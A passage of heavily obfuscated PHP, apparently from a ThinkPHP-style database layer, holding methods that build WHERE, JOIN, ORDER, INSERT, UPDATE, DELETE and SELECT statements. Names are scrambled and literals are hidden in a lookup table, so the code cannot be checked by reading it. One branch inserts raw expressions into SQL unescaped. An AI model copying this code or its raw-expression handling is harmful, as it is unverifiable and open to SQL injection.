$e¢ãºåÑİÕ = $Eãòã‹ö†[894] . $this->escapeString($e¢ãºåÑİÕ) . $Eãòã‹ö†[894]; } elseif (isset($e¢ãºåÑİÕ[0]) && is_string($e¢ãºåÑİÕ[0]) && strtolower($e¢ãºåÑİÕ[0]) == $Eãòã‹ö†[300]) { $e¢ãºåÑİÕ = $this->escapeString($e¢ãºåÑİÕ[1]); } elseif (is_array($e¢ãºåÑİÕ)) { $e¢ãºåÑİÕ = array_map(array($this, $Eãòã‹ö†[895]), $e¢ãºåÑİÕ); } elseif (is_bool($e¢ãºåÑİÕ)) { $e¢ãºåÑİÕ = $e¢ãºåÑİÕ ? $Eãòã‹ö†[83] : $Eãòã‹ö†[494]; } elseif (is_null($e¢ãºåÑİÕ)) { $e¢ãºåÑİÕ = $Eãòã‹ö†[99]; } return $e¢ãºåÑİÕ; } protected function parseField($Cİ®‚šÓó¦) { $Fƒ– Ä´­ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_string($Cİ®‚šÓó¦) && strpos($Cİ®‚šÓó¦, $Fƒ– Ä´­[47])) { $Cİ®‚šÓó¦ = explode($Fƒ– Ä´­[47], $Cİ®‚šÓó¦); } if (is_array($Cİ®‚šÓó¦)) { $B¡ò§‰´‹ = array(); foreach ($Cİ®‚šÓó¦ as $C×§…±ÉÖ => $Aª½’¸“»‹) { if (!is_numeric($C×§…±ÉÖ)) { $B¡ò§‰´‹[] = $this->parseKey($C×§…±ÉÖ) . $Fƒ– Ä´­[933] . $this->parseKey($Aª½’¸“»‹); } else { $B¡ò§‰´‹[] = $this->parseKey($Aª½’¸“»‹); } } $DÊöõ³¶¶ = implode($Fƒ– Ä´­[47], $B¡ò§‰´‹); } elseif (is_string($Cİ®‚šÓó¦) && !empty($Cİ®‚šÓó¦)) { $DÊöõ³¶¶ = $Cİ®‚šÓó¦; } else { $DÊöõ³¶¶ = $Fƒ– Ä´­[190]; } return $DÊöõ³¶¶; } protected function parseTable($Féñ¥µ¥è) { $CÎ¨Ùå´Í =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($Féñ¥µ¥è)) { $dËØíöÍœ’ = array(); foreach ($Féñ¥µ¥è as $b£¯¤¯‘Š => $d™ºÑ–•â ) { if (!is_numeric($b£¯¤¯‘Š)) { $dËØíöÍœ’[] = $this->parseKey($b£¯¤¯‘Š) . $CÎ¨Ùå´Í[50] . $this->parseKey($d™ºÑ–•â ); } else { $dËØíöÍœ’[] = $this->parseKey($b£¯¤¯‘Š); } } $Féñ¥µ¥è = $dËØíöÍœ’; } elseif (is_string($Féñ¥µ¥è)) { if (strstr($Féñ¥µ¥è, $CÎ¨Ùå´Í[50])) { return $Féñ¥µ¥è; } $Féñ¥µ¥è = explode($CÎ¨Ùå´Í[47], $Féñ¥µ¥è); array_walk($Féñ¥µ¥è, array($this, $CÎ¨Ùå´Í[844])); } return $CÎ¨Ùå´Í[838] . trim(implode($CÎ¨Ùå´Í[934], $Féñ¥µ¥è), $CÎ¨Ùå´Í[384]) . $CÎ¨Ùå´Í[838]; } protected function parseWhere($a™²·â¬¹) { $f¸Æ¹¿ÚË¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÃù‡Ò”Í’ = $f¸Æ¹¿ÚË¤[33]; if (is_string($a™²·â¬¹)) { $AÃù‡Ò”Í’ = $a™²·â¬¹; } else { $Bá¶òâ“ = isset($a™²·â¬¹[$f¸Æ¹¿ÚË¤[935]]) ? strtoupper($a™²·â¬¹[$f¸Æ¹¿ÚË¤[935]]) : $f¸Æ¹¿ÚË¤[33]; if (in_array($Bá¶òâ“, array($f¸Æ¹¿ÚË¤[936], $f¸Æ¹¿ÚË¤[937], $f¸Æ¹¿ÚË¤[938]))) { $Bá¶òâ“ = $f¸Æ¹¿ÚË¤[50] . $Bá¶òâ“ . $f¸Æ¹¿ÚË¤[50]; unset($a™²·â¬¹[$f¸Æ¹¿ÚË¤[935]]); } else { $Bá¶òâ“ = $f¸Æ¹¿ÚË¤[939]; } foreach ($a™²·â¬¹ as $cÌçó¹øòÂ => $b†ç¡Èô”µ) { $AÃù‡Ò”Í’ .= $f¸Æ¹¿ÚË¤[280]; if (is_numeric($cÌçó¹øòÂ)) { $cÌçó¹øòÂ = $f¸Æ¹¿ÚË¤[940]; } if (0 === strpos($cÌçó¹øòÂ, $f¸Æ¹¿ÚË¤[70])) { $AÃù‡Ò”Í’ .= $this->parseThinkWhere($cÌçó¹øòÂ, $b†ç¡Èô”µ); } else { if (!preg_match($f¸Æ¹¿ÚË¤[941], trim($cÌçó¹øòÂ))) { think_exception(think_lang($f¸Æ¹¿ÚË¤[942]) . $f¸Æ¹¿ÚË¤[4] . $cÌçó¹øòÂ); } $DŠÁÔÕ£‰É = is_array($b†ç¡Èô”µ) && isset($b†ç¡Èô”µ[$f¸Æ¹¿ÚË¤[943]]); $cÌçó¹øòÂ = trim($cÌçó¹øòÂ); if (strpos($cÌçó¹øòÂ, $f¸Æ¹¿ÚË¤[286])) { $a›©ó×´æ½ = explode($f¸Æ¹¿ÚË¤[286], $cÌçó¹øòÂ); $c¿†à²†¥ = array(); foreach ($a›©ó×´æ½ as $CÄÍ“É” => $aºŸ»¬ÅÓÒ) { $e‰­Ä‚Úî = $DŠÁÔÕ£‰É ? $b†ç¡Èô”µ[$CÄÍ“É”] : $b†ç¡Èô”µ; $c¿†à²†¥[] = $f¸Æ¹¿ÚË¤[263] . $this->parseWhereItem($this->parseKey($aºŸ»¬ÅÓÒ), $e‰­Ä‚Úî) . $f¸Æ¹¿ÚË¤[843]; } $AÃù‡Ò”Í’ .= implode($f¸Æ¹¿ÚË¤[944], $c¿†à²†¥); } elseif (strpos($cÌçó¹øòÂ, $f¸Æ¹¿ÚË¤[287])) { $a›©ó×´æ½ = explode($f¸Æ¹¿ÚË¤[287], $cÌçó¹øòÂ); $c¿†à²†¥ = array(); foreach ($a›©ó×´æ½ as $CÄÍ“É” => $aºŸ»¬ÅÓÒ) { $e‰­Ä‚Úî = $DŠÁÔÕ£‰É ? $b†ç¡Èô”µ[$CÄÍ“É”] : $b†ç¡Èô”µ; $c¿†à²†¥[] = $f¸Æ¹¿ÚË¤[263] . $this->parseWhereItem($this->parseKey($aºŸ»¬ÅÓÒ), $e‰­Ä‚Úî) . $f¸Æ¹¿ÚË¤[843]; } $AÃù‡Ò”Í’ .= implode($f¸Æ¹¿ÚË¤[939], $c¿†à²†¥); } else { $AÃù‡Ò”Í’ .= $this->parseWhereItem($this->parseKey($cÌçó¹øòÂ), $b†ç¡Èô”µ); } } $AÃù‡Ò”Í’ .= $f¸Æ¹¿ÚË¤[281] . $Bá¶òâ“; } $AÃù‡Ò”Í’ = substr($AÃù‡Ò”Í’, 0, -strlen($Bá¶òâ“)); } return empty($AÃù‡Ò”Í’) ? $f¸Æ¹¿ÚË¤[33] : $f¸Æ¹¿ÚË¤[945] . $AÃù‡Ò”Í’; } protected function parseWhereItem($BÙÈğºŒ¦ö, $D•‡ŸƒŠòÏ) { $DŸÂš°ï =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÁ¦Øò¨‡Î = $DŸÂš°ï[33]; if (is_array($D•‡ŸƒŠòÏ)) { if (is_string($D•‡ŸƒŠòÏ[0])) { $FÇÑ¾Œ³‹ = strtolower($D•‡ŸƒŠòÏ[0]); if (in_array($D•‡ŸƒŠòÏ[0], array($DŸÂš°ï[929], $DŸÂš°ï[946], $DŸÂš°ï[947], $DŸÂš°ï[948], $DŸÂš°ï[949], $DŸÂš°ï[950]))) { $EÁ¦Øò¨‡Î .= $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $D•‡ŸƒŠòÏ[0] . $DŸÂš°ï[50] . $this->parseValue($D•‡ŸƒŠòÏ[1]); } elseif (preg_match($DŸÂš°ï[951], $D•‡ŸƒŠòÏ[0])) { $EÁ¦Øò¨‡Î .= $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $this->exp[$FÇÑ¾Œ³‹] . $DŸÂš°ï[50] . $this->parseValue($D•‡ŸƒŠòÏ[1]); } elseif (preg_match($DŸÂš°ï[952], $D•‡ŸƒŠòÏ[0])) { if (is_array($D•‡ŸƒŠòÏ[1])) { $E¿²„×ùµ = isset($D•‡ŸƒŠòÏ[2]) ? strtoupper($D•‡ŸƒŠòÏ[2]) : $DŸÂš°ï[937]; if (in_array($E¿²„×ùµ, array($DŸÂš°ï[936], $DŸÂš°ï[937], $DŸÂš°ï[938]))) { $BÈ“¹‹ ¹š = array(); foreach ($D•‡ŸƒŠòÏ[1] as $BÓ‘Ñò˜—Ä) { $BÈ“¹‹ ¹š[] = $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $this->exp[$FÇÑ¾Œ³‹] . $DŸÂš°ï[50] . $this->parseValue($BÓ‘Ñò˜—Ä); } $EÁ¦Øò¨‡Î .= $DŸÂš°ï[263] . implode($DŸÂš°ï[50] . $E¿²„×ùµ . $DŸÂš°ï[50], $BÈ“¹‹ ¹š) . $DŸÂš°ï[843]; } } else { $EÁ¦Øò¨‡Î .= $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $this->exp[$FÇÑ¾Œ³‹] . $DŸÂš°ï[50] . $this->parseValue($D•‡ŸƒŠòÏ[1]); } } elseif ($DŸÂš°ï[300] == $FÇÑ¾Œ³‹) { $EÁ¦Øò¨‡Î .= $DŸÂš°ï[841] . $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $D•‡ŸƒŠòÏ[1] . $DŸÂš°ï[953]; } elseif (preg_match($DŸÂš°ï[954], $D•‡ŸƒŠòÏ[0])) { $EÁ¦Øò¨‡Î .= $D•‡ŸƒŠòÏ[0]; } elseif (preg_match($DŸÂš°ï[955], $D•‡ŸƒŠòÏ[0])) { if (isset($D•‡ŸƒŠòÏ[2]) && $DŸÂš°ï[300] == $D•‡ŸƒŠòÏ[2]) { $EÁ¦Øò¨‡Î .= $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $this->exp[$FÇÑ¾Œ³‹] . $DŸÂš°ï[50] . $D•‡ŸƒŠòÏ[1]; } else { if (is_string($D•‡ŸƒŠòÏ[1])) { $D•‡ŸƒŠòÏ[1] = explode($DŸÂš°ï[47], $D•‡ŸƒŠòÏ[1]); } $fôŸëƒÂù = implode($DŸÂš°ï[47], $this->parseValue($D•‡ŸƒŠòÏ[1])); $EÁ¦Øò¨‡Î .= $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $this->exp[$FÇÑ¾Œ³‹] . $DŸÂš°ï[841] . $fôŸëƒÂù . $DŸÂš°ï[843]; } } elseif (preg_match($DŸÂš°ï[956], $D•‡ŸƒŠòÏ[0])) { $dãœšÔ¹· = is_string($D•‡ŸƒŠòÏ[1]) ? explode($DŸÂš°ï[47], $D•‡ŸƒŠòÏ[1]) : $D•‡ŸƒŠòÏ[1]; $EÁ¦Øò¨‡Î .= $DŸÂš°ï[841] . $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $this->exp[$FÇÑ¾Œ³‹] . $DŸÂš°ï[50] . $this->parseValue($dãœšÔ¹·[0]) . $DŸÂš°ï[939] . $this->parseValue($dãœšÔ¹·[1]) . $DŸÂš°ï[281]; } else { think_exception(think_lang($DŸÂš°ï[942]) . $DŸÂš°ï[4] . $D•‡ŸƒŠòÏ[0]); } } else { $bğ‡öİÆëÚ = count($D•‡ŸƒŠòÏ); $cõùÙ×ç¹ = isset($D•‡ŸƒŠòÏ[$bğ‡öİÆëÚ - 1]) ? strtoupper($D•‡ŸƒŠòÏ[$bğ‡öİÆëÚ - 1]) : $DŸÂš°ï[33]; if (in_array($cõùÙ×ç¹, array($DŸÂš°ï[936], $DŸÂš°ï[937], $DŸÂš°ï[938]))) { $bğ‡öİÆëÚ = $bğ‡öİÆëÚ - 1; } else { $cõùÙ×ç¹ = $DŸÂš°ï[936]; } for ($bÕ’ªŸº…Ñ = 0; $bÕ’ªŸº…Ñ < $bğ‡öİÆëÚ; $bÕ’ªŸº…Ñ++) { $dãœšÔ¹· = is_array($D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ]) ? $D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ][1] : $D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ]; if ($DŸÂš°ï[300] == strtolower($D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ][0])) { $EÁ¦Øò¨‡Î .= $DŸÂš°ï[263] . $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $dãœšÔ¹· . $DŸÂš°ï[953] . $cõùÙ×ç¹ . $DŸÂš°ï[50]; } else { $D®Â¯×æßí = is_array($D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ]) ? $this->exp[strtolower($D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ][0])] : $DŸÂš°ï[929]; if (!$D®Â¯×æßí && is_array($D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ]) && in_array($D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ][0], array($DŸÂš°ï[929], $DŸÂš°ï[946], $DŸÂš°ï[947], $DŸÂš°ï[948], $DŸÂš°ï[949], $DŸÂš°ï[950]))) { $D®Â¯×æßí = $D•‡ŸƒŠòÏ[$bÕ’ªŸº…Ñ][0]; } $EÁ¦Øò¨‡Î .= $DŸÂš°ï[263] . $BÙÈğºŒ¦ö . $DŸÂš°ï[50] . $D®Â¯×æßí . $DŸÂš°ï[50] . $this->parseValue($dãœšÔ¹·) . $DŸÂš°ï[953] . $cõùÙ×ç¹ . $DŸÂš°ï[50]; } } $EÁ¦Øò¨‡Î = substr($EÁ¦Øò¨‡Î, 0, -4); } } else { $EÁ¦Øò¨‡Î .= $BÙÈğºŒ¦ö . $DŸÂš°ï[957] . $this->parseValue($D•‡ŸƒŠòÏ); } return $EÁ¦Øò¨‡Î; } protected function parseThinkWhere($aª¤¬ˆƒ§Ï, $F¦ÍàŞ‘¬Æ) { $C×Ğàµìñ¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cë‡éå¦Š˜ = $C×Ğàµìñ¨[33]; switch ($aª¤¬ˆƒ§Ï) { case $C×Ğàµìñ¨[355]: $Cë‡éå¦Š˜ = $F¦ÍàŞ‘¬Æ; break; case $C×Ğàµìñ¨[940]: $Cë‡éå¦Š˜ = is_string($F¦ÍàŞ‘¬Æ) ? $F¦ÍàŞ‘¬Æ : substr($this->parseWhere($F¦ÍàŞ‘¬Æ), 6); break; case $C×Ğàµìñ¨[958]: parse_str($F¦ÍàŞ‘¬Æ, $BõÇ«É±‚Å); if (isset($BõÇ«É±‚Å[$C×Ğàµìñ¨[935]])) { $E÷ÚÚò°»Á = $C×Ğàµìñ¨[50] . strtoupper($BõÇ«É±‚Å[$C×Ğàµìñ¨[935]]) . $C×Ğàµìñ¨[50]; unset($BõÇ«É±‚Å[$C×Ğàµìñ¨[935]]); } else { $E÷ÚÚò°»Á = $C×Ğàµìñ¨[939]; } $C©ºÈ‡­‰õ = array(); foreach ($BõÇ«É±‚Å as $eÛÑñØÏ‰ => $aàæÑãˆé) { $C©ºÈ‡­‰õ[] = $this->parseKey($eÛÑñØÏ‰) . $C×Ğàµìñ¨[957] . $this->parseValue($aàæÑãˆé); } $Cë‡éå¦Š˜ = implode($E÷ÚÚò°»Á, $C©ºÈ‡­‰õ); break; } return $Cë‡éå¦Š˜; } protected function parseLimit($Dã”Çéâä) { $fì±îæŒ¸’ =& $_SERVER[åÌÛ»ô¢‚ö™]; return !empty($Dã”Çéâä) ? $fì±îæŒ¸’[48] . $Dã”Çéâä . $fì±îæŒ¸’[50] : $fì±îæŒ¸’[33]; } protected function parseJoin($D·š¢ˆ§Ã) { $f‘§•ãÑÜö =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÃåŒËÔ•… = $f‘§•ãÑÜö[33]; if (!empty($D·š¢ˆ§Ã)) { if (is_array($D·š¢ˆ§Ã)) { foreach ($D·š¢ˆ§Ã as $DãÂ©Œ—ò => $Eî…§ ö‹õ) { if (!1 !== stripos($Eî…§ ö‹õ, $f‘§•ãÑÜö[959])) { $CÃåŒËÔ•… .= $f‘§•ãÑÜö[50] . $Eî…§ ö‹õ; } else { $CÃåŒËÔ•… .= $f‘§•ãÑÜö[960] . $Eî…§ ö‹õ; } } } else { $CÃåŒËÔ•… .= $f‘§•ãÑÜö[960] . $D·š¢ˆ§Ã; } } $CÃåŒËÔ•… = preg_replace($f‘§•ãÑÜö[961], think_config($f‘§•ãÑÜö[867]) . $f‘§•ãÑÜö[962], $CÃåŒËÔ•…); return $CÃåŒËÔ•…; } protected function parseOrder($fÃ“Õä–‹) { $F°ØÜ™ÏØ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($fÃ“Õä–‹)) { $fµÆâíâÃ» = array(); foreach ($fÃ“Õä–‹ as $aÅšª‚°‡ => $AŒÂŠØ¯¥ä) { if (is_numeric($aÅšª‚°‡)) { $fµÆâíâÃ»[] = $this->parseKey($AŒÂŠØ¯¥ä); } else { $AŒÂŠØ¯¥ä = in_array(strtoupper(trim($AŒÂŠØ¯¥ä)), array($F°ØÜ™ÏØ[963], $F°ØÜ™ÏØ[964])) ? $F°ØÜ™ÏØ[50] . $AŒÂŠØ¯¥ä : $F°ØÜ™ÏØ[33]; if (preg_match($F°ØÜ™ÏØ[965], $aÅšª‚°‡)) { $fµÆâíâÃ»[] = $this->parseKey($aÅšª‚°‡) . $AŒÂŠØ¯¥ä; } else { think_exception($F°ØÜ™ÏØ[966] . $aÅšª‚°‡); } } } $fÃ“Õä–‹ = implode($F°ØÜ™ÏØ[47], $fµÆâíâÃ»); } return !empty($fÃ“Õä–‹) ? $F°ØÜ™ÏØ[967] . $fÃ“Õä–‹ : $F°ØÜ™ÏØ[33]; } protected function parseGroup($c¶ˆÃôÀ) { $aÓğ‰ÚÌöí =& $_SERVER[åÌÛ»ô¢‚ö™]; return !empty($c¶ˆÃôÀ) ? $aÓğ‰ÚÌöí[968] . $c¶ˆÃôÀ : $aÓğ‰ÚÌöí[33]; } protected function parseHaving($AˆÇœŠì±‡) { $B‡Ï§í¥İà =& $_SERVER[åÌÛ»ô¢‚ö™]; return !empty($AˆÇœŠì±‡) ? $B‡Ï§í¥İà[969] . $AˆÇœŠì±‡ : $B‡Ï§í¥İà[33]; } protected function parseComment($F¸¨…ËÉ¨á) { $DÎÓÌÔÎòì =& $_SERVER[åÌÛ»ô¢‚ö™]; return !empty($F¸¨…ËÉ¨á) ? $DÎÓÌÔÎòì[970] . $F¸¨…ËÉ¨á . $DÎÓÌÔÎòì[971] : $DÎÓÌÔÎòì[33]; } protected function parseDistinct($bÀÍêåÔ´¿) { $d¿ç˜Ì =& $_SERVER[åÌÛ»ô¢‚ö™]; return !empty($bÀÍêåÔ´¿) ? $d¿ç˜Ì[972] : $d¿ç˜Ì[33]; } protected function parseUnion($dø—ùÇ‘ÁÆ) { $aÆ ´Šë°ß =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($dø—ùÇ‘ÁÆ)) { return $aÆ ´Šë°ß[33]; } if (isset($dø—ùÇ‘ÁÆ[$aÆ ´Šë°ß[351]])) { $Cóµ…»“Æ = $aÆ ´Šë°ß[973]; unset($dø—ùÇ‘ÁÆ[$aÆ ´Šë°ß[351]]); } else { $Cóµ…»“Æ = $aÆ ´Šë°ß[974]; } foreach ($dø—ùÇ‘ÁÆ as $CŒ›©ÔˆŸÇ) { $B±’®¨ê[] = $Cóµ…»“Æ . (is_array($CŒ›©ÔˆŸÇ) ? $this->buildSelectSql($CŒ›©ÔˆŸÇ) : $CŒ›©ÔˆŸÇ); } return implode($aÆ ´Šë°ß[50], $B±’®¨ê); } public function insert($AÈğŠ–ïŠ, $a® Ôº¥×Ë = array(), $eê³ĞÎÛë = false) { goto AÖ ó´ƒƒÊ; AÖ ó´ƒƒÊ: $eì„±÷Í‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A‚¬ˆñÕ×¸ = $eóêŠã˜ìğ = array(); $this->model = $a® Ôº¥×Ë[$eì„±÷Í‹[284]]; goto Eêö¢‡˜³; FŠ„†º¡ªÏ: $Ešà¦ï¦Ø• .= $this->parseComment(!empty($a® Ôº¥×Ë[$eì„±÷Í‹[357]]) ? $a® Ôº¥×Ë[$eì„±÷Í‹[357]] : $eì„±÷Í‹[33]); return $this->execute($Ešà¦ï¦Ø•, $this->parseBind(!empty($a® Ôº¥×Ë[$eì„±÷Í‹[288]]) ? $a® Ôº¥×Ë[$eì„±÷Í‹[288]] : array())); goto BğÈ¸ÄÒÉ•; Eêö¢‡˜³: foreach ($AÈğŠ–ïŠ as $Bí×à„Ôöó => $Eèï«Œ“ŒÒ) { if (is_array($Eèï«Œ“ŒÒ) && $eì„±÷Í‹[300] == $Eèï«Œ“ŒÒ[0]) { $eóêŠã˜ìğ[] = $this->parseKey($Bí×à„Ôöó); $A‚¬ˆñÕ×¸[] = $Eèï«Œ“ŒÒ[1]; } elseif (is_scalar($Eèï«Œ“ŒÒ) || is_null($Eèï«Œ“ŒÒ)) { $eóêŠã˜ìğ[] = $this->parseKey($Bí×à„Ôöó); $A‚¬ˆñÕ×¸[] = $this->parseValue($Eèï«Œ“ŒÒ); } } $Ešà¦ï¦Ø• = ($eê³ĞÎÛë ? $eì„±÷Í‹[845] : $eì„±÷Í‹[846]) . $eì„±÷Í‹[847] . $this->parseTable($a® Ôº¥×Ë[$eì„±÷Í‹[282]]) . $eì„±÷Í‹[841] . implode($eì„±÷Í‹[47], $eóêŠã˜ìğ) . $eì„±÷Í‹[842] . implode($eì„±÷Í‹[47], $A‚¬ˆñÕ×¸) . $eì„±÷Í‹[843]; $Ešà¦ï¦Ø• .= $this->parseLock(isset($a® Ôº¥×Ë[$eì„±÷Í‹[798]]) ? $a® Ôº¥×Ë[$eì„±÷Í‹[798]] : !1); goto FŠ„†º¡ªÏ; BğÈ¸ÄÒÉ•: } public function selectInsert($f¸ğÅó†¤ˆ, $d½Ü«ºë½, $DôËˆÛšÅ = array()) { goto a¼İó‹£ßò; a¼İó‹£ßò: $C¿¨õºòì¨ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->model = $DôËˆÛšÅ[$C¿¨õºòì¨[284]]; if (is_string($f¸ğÅó†¤ˆ)) { $f¸ğÅó†¤ˆ = explode($C¿¨õºòì¨[47], $f¸ğÅó†¤ˆ); } goto fİƒ§–èïÖ; A¬½¨çÙõ: return $this->execute($BñÆÌÆ, $this->parseBind(!empty($DôËˆÛšÅ[$C¿¨õºòì¨[288]]) ? $DôËˆÛšÅ[$C¿¨õºòì¨[288]] : array())); goto CŠ³¢Åä£±; fİƒ§–èïÖ: array_walk($f¸ğÅó†¤ˆ, array($this, $C¿¨õºòì¨[844])); $BñÆÌÆ = $C¿¨õºòì¨[975] . $this->parseTable($d½Ü«ºë½) . $C¿¨õºòì¨[841] . implode($C¿¨õºòì¨[47], $f¸ğÅó†¤ˆ) . $C¿¨õºòì¨[953]; $BñÆÌÆ .= $this->buildSelectSql($DôËˆÛšÅ); goto A¬½¨çÙõ; CŠ³¢Åä£±: } public function update($aé‘‹§³İ¢, $A¡ÕõÆÌ£) { $c™ªÑŸëŸ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->model = $A¡ÕõÆÌ£[$c™ªÑŸëŸ[284]]; $AÆõéÒ÷Û˜ = $c™ªÑŸëŸ[976] . $this->parseTable($A¡ÕõÆÌ£[$c™ªÑŸëŸ[282]]) . $this->parseSet($aé‘‹§³İ¢) . $this->parseWhere(!empty($A¡ÕõÆÌ£[$c™ªÑŸëŸ[278]]) ? $A¡ÕõÆÌ£[$c™ªÑŸëŸ[278]] : $c™ªÑŸëŸ[33]) . $this->parseOrder(!empty($A¡ÕõÆÌ£[$c™ªÑŸëŸ[366]]) ? $A¡ÕõÆÌ£[$c™ªÑŸëŸ[366]] : $c™ªÑŸëŸ[33]) . $this->parseLimit(!empty($A¡ÕõÆÌ£[$c™ªÑŸëŸ[295]]) ? $A¡ÕõÆÌ£[$c™ªÑŸëŸ[295]] : $c™ªÑŸëŸ[33]) . $this->parseLock(isset($A¡ÕõÆÌ£[$c™ªÑŸëŸ[798]]) ? $A¡ÕõÆÌ£[$c™ªÑŸëŸ[798]] : !1) . $this->parseComment(!empty($A¡ÕõÆÌ£[$c™ªÑŸëŸ[357]]) ? $A¡ÕõÆÌ£[$c™ªÑŸëŸ[357]] : $c™ªÑŸëŸ[33]); return $this->execute($AÆõéÒ÷Û˜, $this->parseBind(!empty($A¡ÕõÆÌ£[$c™ªÑŸëŸ[288]]) ? $A¡ÕõÆÌ£[$c™ªÑŸëŸ[288]] : array())); } public function delete($cÀçŞ‘×¸¹ = array()) { $bÏõ¢¿»‰£ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->model = $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[284]]; $e“—‰Ã´ë = $bÏõ¢¿»‰£[977] . $this->parseTable($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[282]]) . $this->parseWhere(!empty($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[278]]) ? $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[278]] : $bÏõ¢¿»‰£[33]) . $this->parseOrder(!empty($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[366]]) ? $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[366]] : $bÏõ¢¿»‰£[33]) . $this->parseLimit(!empty($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[295]]) ? $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[295]] : $bÏõ¢¿»‰£[33]) . $this->parseLock(isset($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[798]]) ? $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[798]] : !1) . $this->parseComment(!empty($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[357]]) ? $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[357]] : $bÏõ¢¿»‰£[33]); return $this->execute($e“—‰Ã´ë, $this->parseBind(!empty($cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[288]]) ? $cÀçŞ‘×¸¹[$bÏõ¢¿»‰£[288]] : array())); } public function select($BßŸòŠİŠº = array()) { goto f­ŒÜ‹‚¿ƒ; f­ŒÜ‹‚¿ƒ: $c¸´ˆì»‚ˆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->model = $BßŸòŠİŠº[$c¸´ˆì»‚ˆ[284]]; $BŒñ„ÆÎèÎ = $this->buildSelectSql($BßŸòŠİŠº); goto E ¿¡ÓøËª; A¸Ñò°¤ÖÕ: if ($C—©¾Ë¿Ø && !1 !== $aÑƒ†Ó…ùì) { think_cache($bóŠÛÊˆĞÜ, $aÑƒ†Ó…ùì, $C—©¾Ë¿Ø); } return $aÑƒ†Ó…ùì; goto Eàò‡½‡‡; E ¿¡ÓøËª: $C—©¾Ë¿Ø = isset($BßŸòŠİŠº[$c¸´ˆì»‚ˆ[352]]) ? $BßŸòŠİŠº[$c¸´ˆì»‚ˆ[352]] : !1; if ($C—©¾Ë¿Ø) { $bóŠÛÊˆĞÜ = is_string($C—©¾Ë¿Ø[$c¸´ˆì»‚ˆ[89]]) ? $C—©¾Ë¿Ø[$c¸´ˆì»‚ˆ[89]] : $c¸´ˆì»‚ˆ[978] . md5($BŒñ„ÆÎèÎ); $B’¬ç³«» = think_cache($bóŠÛÊˆĞÜ, $c¸´ˆì»‚ˆ[33], $C—©¾Ë¿Ø); if (!1 !== $B’¬ç³«») { return $B’¬ç³«»; } } $aÑƒ†Ó…ùì = $this->query($BŒñ„ÆÎèÎ, $this->parseBind(!empty($BßŸòŠİŠº[$c¸´ˆì»‚ˆ[288]]) ? $BßŸòŠİŠº[$c¸´ˆì»‚ˆ[288]] : array())); goto A¸Ñò°¤ÖÕ; Eàò‡½‡‡: } public function buildSelectSql($eÉäÓ¨°¯ = array()) { goto E¹„—¼ƒµ; b…×Ôˆ‰´: $e¨‡‡Èµµ½ = $this->parseSql($this->selectSql, $eÉäÓ¨°¯); $e¨‡‡Èµµ½ .= $this->parseLock(isset($eÉäÓ¨°¯[$f“•¯ÕÓ‰[798]]) ? $eÉäÓ¨°¯[$f“•¯ÕÓ‰[798]] : !1); if (isset($c¹ºó•…Å½)) { think_cache($c¹ºó•…Å½, $e¨‡‡Èµµ½); } goto b·‰ÄŠ±ßä; b·‰ÄŠ±ßä: return $e¨‡‡Èµµ½; goto f‡ÃµåÓí; E¹„—¼ƒµ: $f“•¯ÕÓ‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($eÉäÓ¨°¯[$f“•¯ÕÓ‰[356]])) { if (strpos($eÉäÓ¨°¯[$f“•¯ÕÓ‰[356]], $f“•¯ÕÓ‰[47])) { list($cš»×ê²Ó´, $b‡¦‰»„åÕ) = explode($f“•¯ÕÓ‰[47], $eÉäÓ¨°¯[$f“•¯ÕÓ‰[356]]); } else { $cš»×ê²Ó´ = $eÉäÓ¨°¯[$f“•¯ÕÓ‰[356]]; } $cš»×ê²Ó´ = $cš»×ê²Ó´ ? $cš»×ê²Ó´ : 1; $b‡¦‰»„åÕ = isset($b‡¦‰»„åÕ) ? $b‡¦‰»„åÕ : (is_numeric($eÉäÓ¨°¯[$f“•¯ÕÓ‰[295]]) ? $eÉäÓ¨°¯[$f“•¯ÕÓ‰[295]] : 20); $E±‘øœô¹° = $b‡¦‰»„åÕ * ((int) $cš»×ê²Ó´ - 1); $eÉäÓ¨°¯[$f“•¯ÕÓ‰[295]] = $E±‘øœô¹° . $f“•¯ÕÓ‰[47] . $b‡¦‰»„åÕ; } if (think_config($f“•¯ÕÓ‰[979])) { $c¹ºó•…Å½ = 